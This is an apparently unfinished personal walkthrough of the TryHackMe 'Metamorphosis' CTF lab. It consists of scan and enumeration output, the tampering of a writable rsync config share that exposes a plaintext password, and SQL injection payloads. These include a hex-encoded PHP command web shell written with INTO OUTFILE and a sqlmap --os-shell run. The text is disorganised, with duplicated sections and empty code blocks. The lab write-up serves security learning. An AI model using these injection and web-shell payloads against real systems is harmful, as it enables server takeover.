<h1 align="center">Metamorphosis</h1>
<p align="center">2025, August 3<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>454</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Part of Incognito CTF</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/d445dc5d-640d-41c7-a8df-31d19b858d8c"><br>
Click <a href=https://tryhackme.com/room/metamorphosis>here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src=""></p>

<br>

<h2>Task 1 . Challenge</h2>
<p>Part of Incognito 2.0 CTF<br>

Like my work, Follow on twitter to be updated and know more about my work! (@0cirius0)</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>user.txt</em><br><a id='1.1'></a>
>> <strong><code>______</code></strong><br>
<p></p>

<br>

> 1.2. <em>root.txt</em><br><a id='1.2'></a>
>> <strong><code>______</code></strong><br>
<p></p>



```bash
:~# nikto -h 10.201.70.130
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.70.130
+ Target Hostname:    10.201.70.130
+ Target Port:        80
+ Start Time:         2025-10-07 21:12:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /admin/config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-10-07 21:12:43 (GMT1) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```





<h1  align="center">Port Scanning<a id='2'></h1>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`               |`HTTP`                |Apache httpd 2.4.41              |
| `139`              |                      |Microsoft Windows netbios-ssn    | 
| `445`              |                      |                                 | 
| `873`              |                      |rsync                            | 

</p></div><br>


```bash
:~/Metamorphosis# nmap -A -vv 10.201.70.130
...
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
873/tcp open  rsync       syn-ack ttl 64 (protocol version 31)
..
Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 11034/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 51363/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 24304/udp): CLEAN (Failed to receive data)
|   Check 4 (port 34541/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-07T20:11:50
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 10.201.70.130
```


```bash
:~# gobuster dir -u http://10.201.70.130/ -w /usr/share/dirb/wordlists/common.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.70.130/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.201.70.130/admin/]
/index.php            (Status: 500) [Size: 0]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

```bash
:~# dirsearch -u http://10.201.70.130 -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_10.201.70.130/_25-10-07_21-16-44.txt

Target: http://10.201.70.130/

[21:16:44] Starting: 
[21:16:52] 301 -  314B  - /admin  ->  http://10.201.70.130/admin/
[21:16:52] 200 -  129B  - /admin/
[21:16:52] 200 -    0B  - /admin/config.php
[21:16:53] 200 -  129B  - /admin/index.php

Task Completed
```


```bash
:~/Metamorphosis# nc -nv 10.201.70.130 873
Connection to 10.201.70.130 873 port [tcp/*] succeeded!
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
Conf           	All Confs
@RSYNCD: EXIT
```

<img width="1254" height="169" alt="image" src="https://github.com/user-attachments/assets/93ea17f2-777f-494e-adb0-3ce5fa2e3b69" />




```bash
:~/Metamorphosis# rsync -av rsync://10.201.70.130/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini

sent 20 bytes  received 379 bytes  798.00 bytes/sec
total size is 193,430  speedup is 484.79
```

<img width="1246" height="372" alt="image" src="https://github.com/user-attachments/assets/256cf80a-3284-4974-92f8-189ddb18f24c" />


```bash
:~/Metamorphosis# mkdir Challenge


:~/Metamorphosis# rsync -av rsync://10.201.70.130/Conf ./Challenge
receiving incremental file list
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini

sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
total size is 193,430  speedup is 0.99
```


<img width="1248" height="369" alt="image" src="https://github.com/user-attachments/assets/660e548e-5b2b-46a6-ae54-826647ae5109" />


```bash
root@ip-10-201-43-110:~/Metamorphosis# cd Challenge
root@ip-10-201-43-110:~/Metamorphosis/Challenge# ls
access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
root@ip-10-201-43-110:~/Metamorphosis/Challenge# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
root@ip-10-201-43-110:~/Metamorphosis/Challenge# nano webapp.ini
root@ip-10-201-43-110:~/Metamorphosis/Challenge# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```




<img width="1244" height="401" alt="image" src="https://github.com/user-attachments/assets/db0a1065-cbbe-4717-98d1-adc0b6379e02" />



```bash
:~/Metamorphosis/Challenge# rsync -av webapp.ini rsync://10.201.70.130/Conf
sending incremental file list
webapp.ini

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31


<img width="1246" height="178" alt="image" src="https://github.com/user-attachments/assets/7b554e6e-9784-4be0-9241-91609abbf030" />

navigated to  10.201.70.130/admin/

<img width="1273" height="320" alt="image" src="https://github.com/user-attachments/assets/f900dfd7-3c74-4bb2-aae3-d84f8d2f6a00" />

Page source

<img width="1275" height="177" alt="image" src="https://github.com/user-attachments/assets/8325f8ab-02bf-47f5-9774-e301579925e0" />


10.201.70.130/admin/


lili
Submit Query

<img width="1277" height="329" alt="image" src="https://github.com/user-attachments/assets/24cc67f8-b663-4d7d-8c0c-73b953c91e99" />

10.201.70.130/admin/config.php

<img width="1273" height="181" alt="image" src="https://github.com/user-attachments/assets/6f9bb743-4680-4ee1-bb61-8432e08e5e96" />



10.201.70.130/admin/

tom
Submit Query


<img width="1274" height="300" alt="image" src="https://github.com/user-attachments/assets/fcfe086f-b747-4ecd-8250-b4c0a5b025df" />


Username Pasword
tom thecat


Inspect
10.201.70.130/admin
Refreshed


<img width="1276" height="527" alt="image" src="https://github.com/user-attachments/assets/b08a08a5-86ba-4aef-bbc6-95580de3d9e1" />




<img width="1279" height="510" alt="image" src="https://github.com/user-attachments/assets/98a0ada8-2693-46a8-938c-bbd4b41e2c63" />




:~/Metamorphosis# python3
Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print (("<? system($_GET['cmd]); ?>").encode('utf-8').hex())
3c3f2073797374656d28245f4745545b27636d645d293b203f3e
>>> 

username=researcher" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/rev.php"-- -

x3rz" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -


username=tom' OR '1'='1

```bash
:~/Metamorphosis# sqlmap -u http://10.201.70.130/admin/ --data "username=FUZZ" --level 5 -D db --tables
...
[22:16:52] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
```

```bash

```


```bash

```


```bash

```


```bash

```


```bash

```






:~/Metamorphosis# smbclient -L incognito.thm/ -U "" -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available


:~/Metamorphosis# smbclient -U "" -N //incognito.thm/print$
tree connect failed: NT_STATUS_ACCESS_DENIED




:~/Metamorphosis# smbclient -U "" -N //incognito.thm/IPC$
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> 



<br>
<br>

```bash
:~/Metamorphosis# rsync -avzh rsync://10.201.123.26/Conf .
receiving incremental file list
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini
```

<img width="1205" height="322" alt="image" src="https://github.com/user-attachments/assets/a45f9d98-94c9-4d8c-874c-a23ca35ad53d" />

<br>
<br>
<br>

```bash
:~/Metamorphosis# ls
access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
```

```bash
:~/Metamorphosis# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis# nano webapp.ini
```

```bash
:~/Metamorphosis# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis# rsync -aPv webapp.ini rsync://10.201.123.26/Conf/webapp.ini
sending incremental file list
webapp.ini
             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31
```

<p align="left">Navigated to <strong>/admin/index.php<br><img width="1200px" src="https://github.com/user-attachments/assets/91298f9f-bf31-4293-89ed-daea48e913ca"></p>

<p align="left">Viewed page source. Identified action=config.php, method=POST, name:'username'.<img width="1200px" src="https://github.com/user-attachments/assets/98ea9d9a-5c2f-4a65-ade5-c457592c58a1"></p>

<p align="left">Launched Burp Suite and enabled FoxyProxy.<br>Refreshed.<br><p><img width="1200px" src="https://github.com/user-attachments/assets/fbb9e7d1-fd7a-4cfd-9cbc-dd7fa6beef8e"></p>

<p align="left">Submitted query<strong><ins>tom</ins></strong><br>Response containd <strong><ins>500 Internal Server Error</ins></strong><p> and redirected to <strong><ins>config.php</ins></strong>.<img width="1200px" src="https://github.com/user-attachments/assets/5bce8b58-cbe6-431e-b2ad-863b6505de47"></p>

<p align="left">Right-clicked Request > clicked <code>Save item</code> > entered a file name > clicked <code>Save</code>. Created <code>request.txt</code>.</p>

<p align="left">Right-clicked Request > clicked <code>Save item</code> > entered a file name > clicked <code>Save</code>. Created <code>request.txt</code>.</p>

< align="enter"><Executed <code>sqlmap</code>.</p>

:~/Metamorphosis# sqlmap -r request.txt --level 5 --risk 3






<h3>873/tcp open  rsync</h3>


```bash
:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx
Conf           	All Confs
```

```bash
:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx/Conf
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
```

```bash
:~/Metamorphosis# rsync -av --list-only rsync://10.201.34.170/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini

sent 20 bytes  received 379 bytes  798.00 bytes/sec
total size is 193,430  speedup is 484.79
```

```bash
:~/Metamorphosis# rsync -aPv rsync://xx.xxx.xxx.xx/Conf ./Conf
receiving incremental file list
created directory ./Conf
./
access.conf
          4,620 100%    4.41MB/s    0:00:00 (xfr#1, to-chk=11/13)
bluezone.ini
          1,341 100%    1.28MB/s    0:00:00 (xfr#2, to-chk=10/13)
debconf.conf
          2,969 100%    2.83MB/s    0:00:00 (xfr#3, to-chk=9/13)
ldap.conf
            332 100%  324.22kB/s    0:00:00 (xfr#4, to-chk=8/13)
lvm.conf
         94,404 100%   90.03MB/s    0:00:00 (xfr#5, to-chk=7/13)
mysql.ini
          9,005 100%    4.29MB/s    0:00:00 (xfr#6, to-chk=6/13)
php.ini
         70,207 100%   22.32MB/s    0:00:00 (xfr#7, to-chk=5/13)
ports.conf
            320 100%   78.12kB/s    0:00:00 (xfr#8, to-chk=4/13)
resolv.conf
            589 100%  143.80kB/s    0:00:00 (xfr#9, to-chk=3/13)
screen-cleanup.conf
             29 100%    5.66kB/s    0:00:00 (xfr#10, to-chk=2/13)
smb.conf
          9,542 100%    1.82MB/s    0:00:00 (xfr#11, to-chk=1/13)
webapp.ini
             72 100%   14.06kB/s    0:00:00 (xfr#12, to-chk=0/13)

sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
total size is 193,430  speedup is 0.99
```

```bash
:~/Metamorphosis/myConf# ls
access.conf   debconf.conf  lvm.conf   php.ini     resolv.conf          smb.conf
bluezone.ini  ldap.conf     mysql.ini  ports.conf  screen-cleanup.conf  webapp.ini
```

```bash
:~/Metamorphosis/Conf# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

<p>

- edited <code>env</code></p>

```bash
:~/Metamorphosis/Conf# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis/myConf# rsync -aPv webapp.ini rsync://xx.xxx.xx.xxx/Conf/webapp.ini
sending incremental file list
webapp.ini
             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31
```

<h2>/admin/</h2>

<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />

<br>
<h2>sqlmap</h2>

```bash
:~/Metamorphosis/myConf# sqlmap -u http://10.201.34.170/admin/index.php --level 5 --risk 3 --batch --os-shell
```

<h2>/admin/</h2>

<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />


<p>

- launched Burp Suite<br>
- enabled FoxyProxy<br>
- Username: <code>tom</code><br>
- clicked Submit Query<br>

</p>

<h2>tom</h2>

<img width="1115" height="163" alt="image" src="https://github.com/user-attachments/assets/bb8eed2f-d752-425c-9c7c-5453d1d54d19" />


```bash

```
ffuf -u http:/10.201.104.23/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403 -e .phps
```

<h3>smb</h3>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p ''
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
```

<h4>Shares</h4>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p '' --shares
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Enumerated shares
SMB         10.201.104.23   445    IP-10-201-104-23 Share           Permissions     Remark
SMB         10.201.104.23   445    IP-10-201-104-23 -----           -----------     ------
SMB         10.201.104.23   445    IP-10-201-104-23 print$                          Printer Drivers
SMB         10.201.104.23   445    IP-10-201-104-23 IPC$                            IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
```

<p>another way ...</p>

```bash
:~/Metamorphosis# smbclient -L metamorphosis.thm -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

<p>another way ...</p>

```bash
:~/Metamorphosis# smbmap -u 'guest' -p '' -H 10.201.104.23
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.201.104.23...
[+] IP: 10.201.104.23:445	Name: ip-10-201-104-23.ec2.internal                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
```

<br>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p '' --rid
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
SMB         10.201.104.23   445    IP-10-201-104-23 [-] RPC lookup failed: RPC method not implemented
```

<br>

```bash
:~/Metamorphosis# smbclient //metamorphosis.thm/print$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

<br>

```bash
~/Metamorphosis# smbclient //10.201.104.23/IPC$ -N
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> exit
```

<br>

<h3>smbmap</h3>

```bash

```




